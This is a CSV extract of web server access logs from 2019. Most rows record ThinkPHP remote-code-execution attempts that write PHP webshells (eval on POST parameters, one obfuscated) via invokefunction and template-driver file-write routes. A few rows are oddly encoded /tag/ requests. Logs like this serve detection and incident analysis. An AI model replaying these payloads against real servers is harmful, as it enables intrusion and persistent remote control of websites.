IP,Data Size,Date Time,Status,URL
223.111.145.141,,03/Jun/2019:06:25:26 +0800,200,HEAD /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppx.php&content=%3C?php%20eval($_POST%5Bppx%5D);?%3Eppxwebshell
122.51.141.108,365,25/Nov/2019:01:42:18 +0800,301,GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?>
122.51.141.108,629,25/Nov/2019:01:42:18 +0800,301,"GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\""axsxsxexrxt\"";$poc_1%20=%20explode(\""x\"",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>"
122.51.141.108,400,25/Nov/2019:01:42:19 +0800,301,"GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php>"
122.51.141.108,24179,25/Nov/2019:01:42:20 +0800,200,"GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php>"
110.249.202.53,17206,12/Dec/2019:04:45:11 +0800,200,GET /tag/%EA%EB%3C%8E%9E%16L/
220.243.136.233,17035,14/Dec/2019:05:19:16 +0800,200,GET /tag/%3C%9D/
111.225.148.162,17165,14/Dec/2019:06:49:46 +0800,200,GET /tag/%3C%B8%D5/
111.225.148.134,17164,14/Dec/2019:07:27:35 +0800,200,GET /tag/%3C%DA/
